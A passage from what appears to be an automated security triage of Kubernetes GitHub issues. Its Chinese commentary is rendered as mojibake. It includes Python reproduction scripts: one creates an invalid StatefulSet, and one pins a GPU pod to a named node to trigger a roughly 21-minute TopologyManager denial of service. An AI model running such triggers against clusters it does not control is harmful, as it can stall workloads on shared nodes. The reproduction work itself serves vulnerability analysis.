                logging.warning(f"Namespace '{namespace}' already exists.")
            else:
                raise

        # 2. Attempt to create the invalid StatefulSet
        logging.info(f"Applying invalid StatefulSet '{statefulset_name}'...")
        apps_v1.create_namespaced_stateful_set(namespace=namespace, body=statefulset_manifest)
        logging.info(f"StatefulSet '{statefulset_name}' created successfully, which demonstrates the validation bypass.")

        # 3. Verify the issue by checking for 'FailedCreate' events
        logging.info("Waiting for 'FailedCreate' event from statefulset-controller...")
        timeout = datetime.now() + timedelta(minutes=2)
        vulnerability_confirmed = False

        while datetime.now() < timeout:
            time.sleep(10)
            events = core_v1.list_namespaced_event(
                namespace,
                field_selector=f"involvedObject.kind=StatefulSet,involvedObject.name={statefulset_name}"
            )

            for event in events.items:
                if event.reason == "FailedCreate" and "whenUnsatisfiable" in event.message:
                    logging.info("Vulnerability Confirmed!")
                    logging.info(f"Found event: Reason='{event.reason}', Message='{event.message}'")
                    vulnerability_confirmed = True
                    break
            
            if vulnerability_confirmed:
                break
        
        if not vulnerability_confirmed:
            logging.error("POC Failed: Did not find the expected 'FailedCreate' event within the timeout period.")

    except kubernetes.client.exceptions.ApiException as e:
        logging.error(f"An unexpected API error occurred: {e.reason} ({e.status})")
        logging.error(f"Body: {e.body}")

    finally:
        # 4. Clean up resources
        logging.info("Cleaning up created resources...")
        try:
            apps_v1.delete_namespaced_stateful_set(
                name=statefulset_name,
                namespace=namespace,
                body=client.V1DeleteOptions(propagation_policy="Foreground"),
            )
            logging.info(f"StatefulSet '{statefulset_name}' deleted.")
            
            # Wait for statefulset to be fully deleted before deleting namespace
            while True:
                try:
                    apps_v1.read_namespaced_stateful_set(name=statefulset_name, namespace=namespace)
                    time.sleep(2)
                except kubernetes.client.exceptions.ApiException as e:
                    if e.status == 404:
                        break
            
            core_v1.delete_namespace(name=namespace)
            logging.info(f"Namespace '{namespace}' deleted.")
        except kubernetes.client.exceptions.ApiException as e:
            if e.status == 404:
                logging.warning("Resources to clean up were not found (already deleted or never created).")
            else:
                logging.error(f"Failed to clean up resources: {e}")

# Directly call the main function as per requirements
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

è¯¥Pythonè„šæœ¬é€šè¿‡ç¼–ç¨‹æ–¹å¼å¤ç°Issueä¸­æè¿°çš„`StatefulSet`éªŒè¯ä¸ä¸€è‡´é—®é¢˜ã€‚

1.  **ç¯å¢ƒé…ç½®**ï¼šè„šæœ¬é¦–å…ˆä½¿ç”¨`kubernetes` Pythonåº“åŠ è½½æœ¬åœ°çš„kubeconfigæ–‡ä»¶ï¼ˆé€šå¸¸ä½äº`~/.kube/config`ï¼‰ï¼Œä»¥è·å¾—ä¸Kubernetesé›†ç¾¤äº¤äº’çš„æƒé™ã€‚
2.  **èµ„æºå®šä¹‰**ï¼šè„šæœ¬åœ¨å†…å­˜ä¸­å®šä¹‰äº†ä¸€ä¸ª`StatefulSet`çš„é…ç½®å­—å…¸ã€‚æ­¤é…ç½®çš„å…³é”®åœ¨äºï¼Œå…¶`spec.template.spec.topologySpreadConstraints`æ•°ç»„ä¸­ç¼ºå°‘äº†å¿…éœ€çš„`whenUnsatisfiable`å­—æ®µã€‚è¿™æ­£æ˜¯Issueä¸­æŒ‡å‡ºçš„æ— æ•ˆé…ç½®ã€‚
3.  **åˆ›å»ºèµ„æº**ï¼š
    *   ä¸ºäº†éš”ç¦»æµ‹è¯•ï¼Œè„šæœ¬é¦–å…ˆä¼šåˆ›å»ºä¸€ä¸ªåä¸º`issue-repro-statefulset`çš„å‘½åç©ºé—´ã€‚
    *   ç„¶åï¼Œå®ƒè°ƒç”¨`create_namespaced_stateful_set`æ–¹æ³•ï¼Œå°è¯•åœ¨é›†ç¾¤ä¸­åˆ›å»ºè¿™ä¸ªæ— æ•ˆçš„`StatefulSet`ã€‚æ ¹æ®Issueçš„æè¿°ï¼ŒAPI Serverä¸ä¼šæ‹’ç»è¿™ä¸ªè¯·æ±‚ï¼Œå› æ­¤åˆ›å»ºæ“ä½œä¼šæˆåŠŸã€‚è„šæœ¬ä¼šæ‰“å°æ—¥å¿—ç¡®è®¤`StatefulSet`å¯¹è±¡å·²æˆåŠŸåˆ›å»ºï¼Œè¿™æœ¬èº«å°±è¯æ˜äº†éªŒè¯é€»è¾‘çš„ç¼ºå¤±ã€‚
4.  **éªŒè¯é—®é¢˜**ï¼š
    *   ä¸ºäº†è¯æ˜`statefulset-controller`ç¡®å®å› æ­¤é…ç½®è€Œé™·å…¥å›°å¢ƒï¼Œè„šæœ¬ä¼šè¿›å…¥ä¸€ä¸ªè½®è¯¢å¾ªç¯ï¼ˆæœ€é•¿2åˆ†é’Ÿï¼‰ï¼Œä»¥æ£€æŸ¥ä¸è¯¥`StatefulSet`ç›¸å…³çš„é›†ç¾¤äº‹ä»¶ã€‚
    *   å®ƒä¼šè¿‡æ»¤äº‹ä»¶ï¼Œå¯»æ‰¾ç”±`statefulset-controller`å‘å‡ºçš„ã€åŸå› ä¸º`FailedCreate`ä¸”æ¶ˆæ¯ä¸­åŒ…å«`whenUnsatisfiable`å…³é”®å­—çš„äº‹ä»¶ã€‚
    *   ä¸€æ—¦æ‰¾åˆ°è¿™æ ·çš„äº‹ä»¶ï¼Œå°±è¯æ˜äº†æ§åˆ¶å™¨æ­£åœ¨å› ä¸ºæ— æ•ˆçš„é…ç½®è€Œæ— æ³•åˆ›å»ºPodã€‚è„šæœ¬ä¼šæ‰“å°ç¡®è®¤ä¿¡æ¯å¹¶æˆåŠŸé€€å‡ºå¾ªç¯ã€‚
5.  **èµ„æºæ¸…ç†**ï¼šæ— è®ºå¤ç°æ˜¯å¦æˆåŠŸï¼Œ`finally`å—éƒ½ä¼šç¡®ä¿åˆ é™¤åˆ›å»ºçš„`StatefulSet`å’Œå‘½åç©ºé—´ï¼Œä¿æŒé›†ç¾¤çš„æ•´æ´ã€‚

è¯¥è„šæœ¬é€šè¿‡å®é™…æ“ä½œè¯æ˜äº†`StatefulSet`èµ„æºåœ¨API Serverå±‚é¢ç¼ºå°‘å¯¹`topologySpreadConstraints`çš„ä¸¥æ ¼éªŒè¯ï¼Œå¯¼è‡´ä¸€ä¸ªæ— æ•ˆçš„èµ„æºè¢«åˆ›å»ºå¹¶å¯¹æ§åˆ¶å¹³é¢ç»„ä»¶é€ æˆä¸å¿…è¦çš„åè°ƒè´Ÿè·ã€‚

---


## Issue #131738 Improve the efficiency of the Kubelet TopologyManager best hint calculation

- Issue é“¾æ¥ï¼š[#131738](https://github.com/kubernetes/kubernetes/issues/131738)

### Issue å†…å®¹

#### What happened?

When we create a 1-GPU pod on a machine with 8 NUMA nodes (AMD CPU + NVIDIA 4090D), the hint providers for CPU, memory, hugepages, and GPU each generate approximately 255 hints. During the hint merging phase, the topology manager needs to evaluate 255^4 (over 4.2 billion) possible hint combinations. In our testing, this process took nearly 21 minutes.
- _The time mentioned here refers to the duration from when the CPU, memory, and device managers each generate their hints, to when the topology manager computes the best hint._

#### What did you expect to happen?

Optimizing the computation efficiency of a podâ€™s best hint down to the second level.

Here are some simple yet high-impact optimization ideas Iâ€™ve identified:
- When the restricted topology manager policy is selected, hints with preferred=false returned by hint providers can be filtered out early, and excluded from the subsequent hint merge logic. This would significantly reduce the computational overhead and improve the efficiency of best hint calculation.
- The number of NUMA nodes involved in the hints returned by the device manager should match the number of requested devices.
For example, when creating a pod requesting 1 GPU, the GPU device manager currently returns 255 hints, but in reality, only 8 of them are valid (e.g., 01, 10, 100, 1000, 10000, 100000, 1000000, 10000000).
The rest are redundant and cause a more than 30-fold decrease in the efficiency of computing the best hint.

![Image](https://github.com/user-attachments/assets/0525accb-ede1-449b-b096-bf8271272c8d)

These optimizations could greatly improve pod admission performance, especially on systems with many NUMA nodes.

#### How can we reproduce it (as minimally and precisely as possible)?

- Kubelet with topology manager configurations. The main configurations:

```yaml
cpuManagerPolicy: static
memoryManagerPolicy: Static
topologyManagerPolicy: best-effort
topologyManagerScope: pod
featureGates:
  CPUManagerPolicyAlphaOptions: true
cpuManagerPolicyOptions:
  distribute-cpus-across-numa: "true"
```

- Create a 1-GPU pod on a node with 8 NUMA nodes and no GPUs currently allocated

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubelet --version
Kubernetes v1.25.12
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# cat /etc/redhat-release
Rocky Linux release 9.2 (Blue Onyx)
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†ä¸€ä¸ªåœ¨ç‰¹å®šç¡¬ä»¶å’Œé…ç½®ä¸‹çš„æ€§èƒ½é—®é¢˜ã€‚å…·ä½“æ¥è¯´ï¼Œå½“åœ¨ä¸€ä¸ªæ‹¥æœ‰8ä¸ªNUMAèŠ‚ç‚¹çš„ç‰©ç†æœºä¸Šåˆ›å»ºä¸€ä¸ªè¯·æ±‚å•ä¸ªGPUçš„Podæ—¶ï¼ŒKubeletçš„TopologyManageråœ¨è®¡ç®—æœ€ä¼˜èµ„æºåˆ†é…æç¤ºï¼ˆbest hintï¼‰æ—¶ï¼Œéœ€è¦å¤„ç†é«˜è¾¾255^4ï¼ˆçº¦42äº¿ï¼‰ç§ç»„åˆï¼Œå¯¼è‡´Podçš„æ¥çº³è¿‡ç¨‹è€—æ—¶è¿‘21åˆ†é’Ÿã€‚

è¿™æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªç®—æ³•å¤æ‚åº¦é—®é¢˜ï¼Œåœ¨ç‰¹å®šæ¡ä»¶ä¸‹ä¼šå¯¼è‡´ä¸¥é‡çš„æ€§èƒ½ä¸‹é™ã€‚ä»å®‰å…¨è§’åº¦çœ‹ï¼Œè¿™ä¸ªé—®é¢˜å¯ä»¥è¢«è§†ä¸ºä¸€ä¸ª**æ‹’ç»æœåŠ¡ï¼ˆDenial of Service, DoSï¼‰**æ¼æ´ã€‚ä¸€ä¸ªæ‹¥æœ‰åœ¨é›†ç¾¤ä¸­åˆ›å»ºPodæƒé™çš„æ”»å‡»è€…ï¼ˆå³ä½¿æ˜¯ä½æƒé™ç”¨æˆ·ï¼‰ï¼Œå¯ä»¥é€šè¿‡ç²¾å¿ƒæ„é€ ä¸€ä¸ªPodï¼ˆå¦‚è¯·æ±‚å°‘é‡GPUå’ŒCPUï¼‰ï¼Œå°†å…¶è°ƒåº¦åˆ°å…·æœ‰å¤šNUMAèŠ‚ç‚¹çš„ç›®æ ‡æœåŠ¡å™¨ä¸Šï¼Œä»è€Œè§¦å‘è¿™ä¸ªé•¿æ—¶é—´çš„è®¡ç®—è¿‡ç¨‹ã€‚

åœ¨è¿™ä¸ªè®¡ç®—è¿‡ç¨‹ä¸­ï¼ˆçº¦21åˆ†é’Ÿï¼‰ï¼Œè¯¥èŠ‚ç‚¹çš„Kubeletä¼šæ¶ˆè€—å¤§é‡CPUæ—¶é—´ï¼Œå¹¶ä¸”æ— æ³•å¤„ç†å…¶ä»–æ–°Podçš„å‡†å…¥è¯·æ±‚ï¼Œå¯¼è‡´è¯¥èŠ‚ç‚¹åœ¨ä¸€æ®µæ—¶é—´å†…å¯¹æ–°çš„å·¥ä½œè´Ÿè½½â€œæ‹’ç»æœåŠ¡â€ã€‚

æ ¹æ®CVSS 3.1æ ‡å‡†è¯„ä¼°è¯¥é£é™©ï¼š
*   **Attack Vector (AV): Network (N)** - æ”»å‡»è€…é€šè¿‡Kubernetes API Serveræäº¤Podï¼Œæ— éœ€ç‰©ç†æˆ–æœ¬åœ°è®¿é—®ã€‚
*   **Attack Complexity (AC): Low (L)** - æ„é€ ä¸€ä¸ªè§¦å‘æ­¤é—®é¢˜çš„Pod YAMLæ–‡ä»¶éå¸¸ç®€å•ï¼Œåªéœ€è¯·æ±‚å°‘é‡GPUå³å¯ã€‚
*   **Privileges Required (PR): Low (L)** - åœ¨å¤šç§Ÿæˆ·ç¯å¢ƒä¸­ï¼Œæ™®é€šç”¨æˆ·é€šå¸¸æ‹¥æœ‰åœ¨å…¶è‡ªå·±çš„å‘½åç©ºé—´ä¸­åˆ›å»ºPodçš„æƒé™ã€‚
*   **User Interaction (UI): None (N)** - æ— éœ€ç”¨æˆ·äº¤äº’ã€‚
*   **Scope (S): Unchanged (U)** - æ¼æ´å½±å“Kubeletè¿›ç¨‹æœ¬èº«ï¼Œä½†ä¸ä¼šå¯¼è‡´æ”»å‡»è€…çªç ´åˆ°èŠ‚ç‚¹æˆ–é›†ç¾¤çš„å…¶ä»–ç»„ä»¶ã€‚
*   **Confidentiality (C): None (N)** - ä¸æ¶‰åŠä¿¡æ¯æ³„éœ²ã€‚
*   **Integrity (I): None (N)** - ä¸æ¶‰åŠæ•°æ®ç¯¡æ”¹ã€‚
*   **Availability (A): High (H)** - Kubeletçš„Podæ¥çº³åŠŸèƒ½åœ¨è¯¥èŠ‚ç‚¹ä¸Šå®Œå…¨ä¸å¯ç”¨ï¼ŒæŒç»­æ—¶é—´è¾ƒé•¿ï¼ˆ21åˆ†é’Ÿï¼‰ï¼Œå¯¹è¯¥èŠ‚ç‚¹çš„å¯ç”¨æ€§é€ æˆäº†ä¸¥é‡å½±å“ã€‚

è®¡ç®—å¾—å‡ºCVSS 3.1è¯„åˆ†ä¸º **6.5 (Medium)**ã€‚

æ ¹æ®æä¾›çš„é£é™©åˆ¤æ–­æ ‡å‡†ï¼š
1.  è¿™æ˜¯ä¸€ä¸ªå®‰å…¨é—®é¢˜ï¼ˆDoSï¼‰ã€‚
2.  CVSSè¯„åˆ†ä¸º6.5ï¼Œå±äºMediumï¼Œä½äºHighã€‚
3.  è§„åˆ™5æŒ‡å‡ºï¼Œå½“åˆ©ç”¨éœ€è¦æ”»å‡»è€…å…·å¤‡åˆ›å»ºã€ä¿®æ”¹ç­‰éåªè¯»æƒé™æ—¶ï¼Œä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚æ­¤æ¼æ´åˆ©ç”¨éœ€è¦`create pod`æƒé™ã€‚
4.  è§„åˆ™7æŒ‡å‡ºï¼Œå‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ç­‰é—®é¢˜æ— è®ºæ˜¯å¦éœ€è¦æƒé™éƒ½åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚æ­¤é—®é¢˜ä¸å±äºè¯¥èŒƒç•´ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè™½ç„¶è¯¥é—®é¢˜å¯ä»¥å¯¼è‡´ç‰¹å®šèŠ‚ç‚¹åœ¨ä¸€æ®µæ—¶é—´å†…æ‹’ç»æœåŠ¡ï¼Œä½†ç”±äºåˆ©ç”¨éœ€è¦Podåˆ›å»ºæƒé™ï¼Œä¸”å½±å“èŒƒå›´æœ‰é™ï¼ˆå•ä¸ªèŠ‚ç‚¹ï¼Œä¸´æ—¶æ€§ï¼‰ï¼Œä¸æ„æˆæ•°æ®æ³„éœ²æˆ–æ§åˆ¶æƒè·å–ç­‰æ›´é«˜å±çš„é£é™©ï¼Œå› æ­¤è¯„çº§ä¸º**ä½é£é™©**ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import os
import time
import threading
import sys
from kubernetes import client, config, watch

# å®šä¹‰ç›®æ ‡èŠ‚ç‚¹åç§°å’Œå‘½åç©ºé—´
# é‡è¦: è¯·å°† NODE_NAME æ›´æ”¹ä¸ºä½ çš„ç¯å¢ƒä¸­å…·æœ‰å¤šNUMAèŠ‚ç‚¹ï¼ˆä¾‹å¦‚8ä¸ªï¼‰å’ŒGPUçš„èŠ‚ç‚¹åç§°
#      å¹¶ä¸”è¯¥èŠ‚ç‚¹ä¸Šçš„Kubeleté…ç½®éœ€è¦ä¸Issueä¸­æè¿°çš„ä¸€è‡´
TARGET_NODE_NAME = os.getenv("TARGET_NODE_NAME", "<your-8-numa-gpu-node-name>")
NAMESPACE = "default"
POD_NAME = "topology-manager-dos-poc"
# è„šæœ¬æ‰§è¡Œè¶…æ—¶æ—¶é—´ï¼ˆç§’ï¼‰
SCRIPT_TIMEOUT = 120 

def main():
    """
    ä¸»æ‰§è¡Œå‡½æ•°
    """
    if TARGET_NODE_NAME == "<your-8-numa-gpu-node-name>":
        print("é”™è¯¯: è¯·è®¾ç½®ç¯å¢ƒå˜é‡ 'TARGET_NODE_NAME' æˆ–ç›´æ¥åœ¨è„šæœ¬ä¸­ä¿®æ”¹ TARGET_NODE_NAME çš„å€¼ã€‚")
        print("è¯¥å€¼åº”ä¸ºä½ çš„K8sé›†ç¾¤ä¸­ä¸€ä¸ªå…·æœ‰å¤šNUMAèŠ‚ç‚¹ï¼ˆå¦‚8ä¸ªï¼‰å’ŒNVIDIA GPUçš„èŠ‚ç‚¹åç§°ã€‚")
        sys.exit(1)

    try:
        # ä»é»˜è®¤ä½ç½®åŠ è½½kubeconfig
        config.load_kube_config()
        api = client.CoreV1Api()
        print("æˆåŠŸè¿æ¥åˆ° Kubernetes é›†ç¾¤ã€‚")
    except Exception as e:
        print(f"æ— æ³•è¿æ¥åˆ° Kubernetes é›†ç¾¤: {e}")
        sys.exit(1)

    # å®šä¹‰Podçš„manifest
    pod_manifest = {
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {"name": POD_NAME},
        "spec": {
            "nodeName": TARGET_NODE_NAME,
            "restartPolicy": "Never",
            "containers": [{
                "name": "gpu-container",
                # ä½¿ç”¨ä¸€ä¸ªç®€å•çš„CUDAç¤ºä¾‹é•œåƒ
                "image": "nvcr.io/nvidia/k8s/cuda-sample:vectoradd-cuda11.7.1-ubuntu20.04",
                "resources": {
                    "requests": {
                        "cpu": "1",
                        "memory": "1Gi"
                    },
                    "limits": {
                        # è¯·æ±‚ä¸€ä¸ªGPUï¼Œè¿™æ˜¯è§¦å‘é—®é¢˜çš„å…³é”®
                        "nvidia.com/gpu": "1"
                    }
                }
            }]
        }
    }

    # åˆ›å»ºä¸€ä¸ªçº¿ç¨‹æ¥æ‰§è¡Œæµ‹è¯•ï¼Œå¹¶è®¾ç½®è¶…æ—¶
    poc_thread = threading.Thread(target=run_poc, args=(api, pod_manifest))
    poc_thread.start()
    poc_thread.join(timeout=SCRIPT_TIMEOUT)

    if poc_thread.is_alive():
        print(f"\né”™è¯¯: è„šæœ¬æ‰§è¡Œè¶…è¿‡äº† {SCRIPT_TIMEOUT} ç§’çš„è¶…æ—¶é™åˆ¶ã€‚")
        print("è¿™å¯èƒ½æ„å‘³ç€Podå¯åŠ¨éå¸¸ç¼“æ…¢ï¼Œç¬¦åˆIssueæè¿°çš„åœºæ™¯ã€‚")
        print("æ­£åœ¨å°è¯•æ¸…ç†èµ„æº...")
        # å³ä½¿çº¿ç¨‹å¡ä½ï¼Œä¸»çº¿ç¨‹ä¹Ÿåº”è¯¥å°è¯•æ¸…ç†Pod
        cleanup(api)
        sys.exit(1)
    
    print("\nè„šæœ¬æ‰§è¡Œå®Œæ¯•ã€‚")


def run_poc(api, pod_manifest):
    """
    æ‰§è¡ŒPOCçš„æ ¸å¿ƒé€»è¾‘ï¼šåˆ›å»ºPodå¹¶ç›‘æ§å…¶å¯åŠ¨æ—¶é—´
    """
    try:
        print(f"å°†åœ¨èŠ‚ç‚¹ '{TARGET_NODE_NAME}' ä¸Šåˆ›å»ºPod '{POD_NAME}'...")
        api.create_namespaced_pod(body=pod_manifest, namespace=NAMESPACE)
        print(f"Pod '{POD_NAME}' å·²æäº¤åˆ›å»ºè¯·æ±‚ã€‚")

        start_time = time.time()
        w = watch.Watch()
        
        print("æ­£åœ¨ç›‘æ§PodçŠ¶æ€... (åœ¨å—å½±å“çš„ç³»ç»Ÿä¸Šï¼Œæ­¤è¿‡ç¨‹å¯èƒ½æŒç»­20åˆ†é’Ÿä»¥ä¸Š)")
        
        # ç›‘æ§Podäº‹ä»¶ï¼Œç›´åˆ°å…¶è¿›å…¥Running, Succeeded æˆ– Failed çŠ¶æ€
        for event in w.stream(api.list_namespaced_pod, namespace=NAMESPACE, field_selector=f"metadata.name={POD_NAME}", timeout_seconds=SCRIPT_TIMEOUT - 10):
            pod_status = event['object'].status.phase
            print(f"  - å½“å‰PodçŠ¶æ€: {pod_status}")
            
            if pod_status in ["Running", "Succeeded", "Failed"]:
                end_time = time.time()
                duration = end_time - start_time
                print(f"\nPod '{POD_NAME}' è¿›å…¥ '{pod_status}' çŠ¶æ€ã€‚")
                print(f"ä»æäº¤åˆ°è¿›å…¥ç»ˆæ­¢/è¿è¡ŒçŠ¶æ€è€—æ—¶: {duration:.2f} ç§’ã€‚")
                
                if duration > 60: # å¦‚æœè€—æ—¶å¾ˆé•¿ï¼Œåˆ™å¾ˆå¯èƒ½å¤ç°äº†é—®é¢˜
                    print("å¤ç°æˆåŠŸ: Podå¯åŠ¨è€—æ—¶è¿‡é•¿ï¼Œç¬¦åˆIssueä¸­æè¿°çš„æ€§èƒ½é—®é¢˜ã€‚")
                else:
                    print("å¤ç°æœªæˆåŠŸ: Podåœ¨æ­£å¸¸æ—¶é—´å†…å¯åŠ¨ã€‚è¯·ç¡®è®¤ç›®æ ‡èŠ‚ç‚¹å’ŒKubeleté…ç½®æ˜¯å¦ç¬¦åˆè¦æ±‚ã€‚")
                
                w.stop()
                return

    except client.ApiException as e:
        print(f"Kubernetes API é”™è¯¯: {e.reason} (Code: {e.status})")
        # å¦‚æœPodå·²å­˜åœ¨ï¼Œå¯èƒ½æ˜¯ä¸Šæ¬¡è¿è¡Œå¤±è´¥ç•™ä¸‹çš„
        if e.status == 409:
            print("Podå·²å­˜åœ¨ï¼Œå¯èƒ½æ˜¯ä¸Šæ¬¡è¿è¡Œæ®‹ç•™ã€‚")
    except Exception as e:
        print(f"æ‰§è¡ŒPOCæ—¶å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}")
    finally:
        # æ¸…ç†èµ„æº
        cleanup(api)

def cleanup(api):
    """
    æ¸…ç†å‡½æ•°ï¼Œåˆ é™¤åˆ›å»ºçš„Pod
    """
    try:
        print(f"\næ­£åœ¨æ¸…ç†èµ„æºï¼Œåˆ é™¤Pod '{POD_NAME}'...")
        api.delete_namespaced_pod(name=POD_NAME, namespace=NAMESPACE, body=client.V1DeleteOptions())
        # ç­‰å¾…Podè¢«åˆ é™¤
        for _ in range(30): # æœ€å¤šç­‰å¾…30ç§’
            try:
                api.read_namespaced_pod(name=POD_NAME, namespace=NAMESPACE)
                time.sleep(1)
            except client.ApiException as e:
                if e.status == 404:
                    print("Pod å·²æˆåŠŸåˆ é™¤ã€‚")
                    return
        print("è­¦å‘Š: ç­‰å¾…Podåˆ é™¤è¶…æ—¶ã€‚")
    except client.ApiException as e:
        if e.status == 404:
            print("Pod å·²è¢«åˆ é™¤æˆ–ä¸å­˜åœ¨ï¼Œæ— éœ€æ¸…ç†ã€‚")
        else:
            print(f"æ¸…ç†Podæ—¶å‘ç”ŸAPIé”™è¯¯: {e}")
    except Exception as e:
        print(f"æ¸…ç†èµ„æºæ—¶å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}")

# ç›´æ¥æ‰§è¡Œmainå‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

ä¸Šè¿°Pythonè„šæœ¬æ—¨åœ¨å¤ç°Issueä¸­æè¿°çš„æ€§èƒ½é—®é¢˜ï¼Œè¯¥é—®é¢˜å¯è¢«åˆ©ç”¨äºå¯¹ç‰¹å®šKubernetesèŠ‚ç‚¹è¿›è¡Œæ‹’ç»æœåŠ¡æ”»å‡»ã€‚

1.  **ç¯å¢ƒå‡†å¤‡**: è„šæœ¬æ‰§è¡Œå‰ï¼Œç”¨æˆ·å¿…é¡»å°†`TARGET_NODE_NAME`å˜é‡è®¾ç½®ä¸ºä¸€ä¸ªçœŸå®å­˜åœ¨çš„KubernetesèŠ‚ç‚¹åç§°ã€‚æ­¤èŠ‚ç‚¹å¿…é¡»æ»¡è¶³Issueä¸­æè¿°çš„æ¡ä»¶ï¼šæ‹¥æœ‰å¤šä¸ªï¼ˆå¦‚8ä¸ªï¼‰NUMAèŠ‚ç‚¹ã€è‡³å°‘ä¸€ä¸ªNVIDIA GPUï¼Œå¹¶ä¸”Kubeleté…ç½®äº†`topologyManagerPolicy: best-effort`ç­‰ç›¸å…³ç­–ç•¥ã€‚å¦‚æœç¯å¢ƒä¸æ»¡è¶³ï¼Œè„šæœ¬å°†æ— æ³•å¤ç°é—®é¢˜ã€‚

2.  **è¿æ¥é›†ç¾¤**: è„šæœ¬ä½¿ç”¨`kubernetes` Pythonåº“ï¼Œé€šè¿‡åŠ è½½æœ¬åœ°çš„`kubeconfig`æ–‡ä»¶ï¼ˆé€šå¸¸ä½äº`~/.kube/config`ï¼‰æ¥è¿æ¥åˆ°Kubernetesé›†ç¾¤ã€‚

3.  **æ„é€ Payload**: è„šæœ¬å®šä¹‰äº†ä¸€ä¸ªPodçš„manifestã€‚è¿™ä¸ªPodï¼š
    *   é€šè¿‡`spec.nodeName`è¢«å¼ºåˆ¶è°ƒåº¦åˆ°`TARGET_NODE_NAME`æŒ‡å®šçš„èŠ‚ç‚¹ä¸Šã€‚
    *   è¯·æ±‚1ä¸ª`nvidia.com/gpu`èµ„æºã€‚è¿™æ˜¯è§¦å‘TopologyManagerå¤æ‚è®¡ç®—çš„å…³é”®ã€‚
    *   ä½¿ç”¨äº†ä¸€ä¸ªæ ‡å‡†çš„NVIDIA CUDAç¤ºä¾‹é•œåƒï¼Œç¡®ä¿å®ƒæ˜¯ä¸€ä¸ªåˆæ³•çš„GPUå·¥ä½œè´Ÿè½½ã€‚

4.  **æ‰§è¡Œä¸ç›‘æ§**:
    *   è„šæœ¬è°ƒç”¨`create_namespaced_pod`åœ¨ç›®æ ‡èŠ‚ç‚¹ä¸Šåˆ›å»ºPodã€‚
    *   åˆ›å»ºåï¼Œå®ƒç«‹å³ä½¿ç”¨`watch`æœºåˆ¶æ¥ç›‘æ§Podçš„çŠ¶æ€å˜åŒ–ã€‚
    *   å®ƒä¼šè®°å½•ä»Podæäº¤åˆ°å…¶çŠ¶æ€å˜ä¸º`Running`ï¼ˆæˆåŠŸå¯åŠ¨ï¼‰ã€`Succeeded`ï¼ˆæˆåŠŸå®Œæˆï¼‰æˆ–`Failed`ï¼ˆå¤±è´¥ï¼‰æ‰€èŠ±è´¹çš„æ—¶é—´ã€‚
    *   åœ¨å—å½±å“çš„ç³»ç»Ÿä¸Šï¼Œè¿™ä¸ªæ—¶é—´ä¼šéå¸¸é•¿ï¼ˆIssueä¸­æåˆ°è¿‘21åˆ†é’Ÿï¼‰ã€‚è„šæœ¬ä¼šæ‰“å°å‡ºè¿™ä¸ªè€—æ—¶ï¼Œå¦‚æœè€—æ—¶æ˜¾è‘—ï¼ˆä¾‹å¦‚è¶…è¿‡1åˆ†é’Ÿï¼‰ï¼Œåˆ™å¯ä»¥è®¤ä¸ºæˆåŠŸå¤ç°äº†è¯¥æ€§èƒ½ç“¶é¢ˆ/DoSé—®é¢˜ã€‚

5.  **è¶…æ—¶ä¸æ¸…ç†**:
    *   è„šæœ¬è®¾ç½®äº†`SCRIPT_TIMEOUT`ï¼ˆ120ç§’ï¼‰çš„å…¨å±€è¶…æ—¶æœºåˆ¶ï¼Œé˜²æ­¢å› Podé•¿æ—¶é—´å¡åœ¨`Pending`çŠ¶æ€è€Œæ— é™æœŸè¿è¡Œã€‚å¦‚æœè¶…æ—¶ï¼Œè„šæœ¬ä¼šé€€å‡ºå¹¶æç¤ºé—®é¢˜å¯èƒ½å·²å¤ç°ã€‚
    *   æ— è®ºæ‰§è¡ŒæˆåŠŸã€å¤±è´¥è¿˜æ˜¯è¶…æ—¶ï¼Œ`finally`å’Œ`cleanup`å‡½æ•°éƒ½ä¼šç¡®ä¿è¢«åˆ›å»ºçš„Podæœ€ç»ˆè¢«åˆ é™¤ï¼Œä»¥ä¿æŒé›†ç¾¤çš„æ•´æ´ã€‚

è¿™ä¸ªPOCé€šè¿‡æ¨¡æ‹Ÿä¸€ä¸ªæ™®é€šç”¨æˆ·åˆ›å»ºPodçš„è¡Œä¸ºï¼Œæ¥è§¦å‘Kubeletå†…éƒ¨çš„æ€§èƒ½ç¼ºé™·ï¼Œä»è€ŒéªŒè¯è¯¥æ‹’ç»æœåŠ¡é£é™©çš„å­˜åœ¨ã€‚

---


## Issue #131735 kubelet device manager provides some useless hints

- Issue é“¾æ¥ï¼š[#131735](https://github.com/kubernetes/kubernetes/issues/131735)

### Issue å†…å®¹

#### What happened?

When I created a 1-GPU pod on an 8 NUMA node (Nvidia 4090D), the device manager provided hints that exceeded the number of GPUs, such as 11, 111, 1111, and so on.

<img width="1431" alt="Image" src="https://github.com/user-attachments/assets/a0efe6c0-9a62-4550-85f9-1a0bad86d9dc" />

#### What did you expect to happen?

The kubelet device manager should provide hints that match the requested number of GPUs. Any other hints will not be used and significantly reduce the efficiency of calculating the best hint. For example, when creating a 1-GPU pod on a node with 8 NUMA nodes, the GPU device manager provided 255 hints, but only 8 of them were valid (01, 10, 100, 1000, 10000, 100000, 1000000, 10000000). This results in a more than 30-fold decrease in the efficiency of best hint computation.

#### How can we reproduce it (as minimally and precisely as possible)?

- Kubelet with topology manager configurations
- Create a 1-GPU pod on a node with 8 NUMA nodes and no GPUs currently allocated

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubelet --version
Kubernetes v1.25.12
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# cat /etc/redhat-release
Rocky Linux release 9.2 (Blue Onyx)
```

</details>


#### Install tools

<details>

</details>


